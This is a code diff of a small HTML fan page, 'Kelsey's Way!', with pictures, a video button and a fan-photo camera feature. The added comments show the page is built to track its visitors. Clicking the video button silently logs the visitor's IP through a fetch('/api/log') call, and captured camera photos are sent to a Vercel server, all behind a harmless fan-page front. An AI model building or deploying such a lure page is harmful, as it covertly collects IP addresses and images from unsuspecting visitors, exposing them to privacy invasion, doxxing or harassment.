@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>Kelsey's Way! ❤️</title>
+
   <link rel="icon" type="image/png" href="Favicon.png">
 
   <style>
@@ -60,12 +61,14 @@
 
 <div class="card">
 
+  <!-- IMAGES -->
   <img src="download.jpg">
   <img src="download (1).jpg">
   <img src="download (2).jpg">
 
   <br>
 
+  <!-- VIDEO BUTTON -->
   <button onclick="showVideo()">Kelsey's Way Edit!!!</button>
 
   <div id="videoBox">
@@ -75,13 +78,15 @@
 
     <br>
 
+    <!-- CAMERA BUTTON -->
     <button onclick="openCamera()">Take Fan Photo 📸</button>
   </div>
 
+  <!-- CAMERA AREA -->
   <div id="cameraBox">
     <video id="video" autoplay></video>
     <br>
-    <button onclick="capture()">Capture</button>
+    <button onclick="capture()">Capture Photo</button>
     <canvas id="canvas" style="display:none;"></canvas>
   </div>
 
@@ -90,11 +95,14 @@
 <script>
 let stream;
 
+/* SHOW VIDEO + LOG IP */
 function showVideo() {
   document.getElementById("videoBox").style.display = "block";
+
   fetch("/api/log");
 }
 
+/* OPEN CAMERA (ASKS PERMISSION) */
 function openCamera() {
   document.getElementById("cameraBox").style.display = "block";
 
@@ -108,6 +116,7 @@ function openCamera() {
     });
 }
 
+/* CAPTURE IMAGE + SEND TO VERCEL */
 function capture() {
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
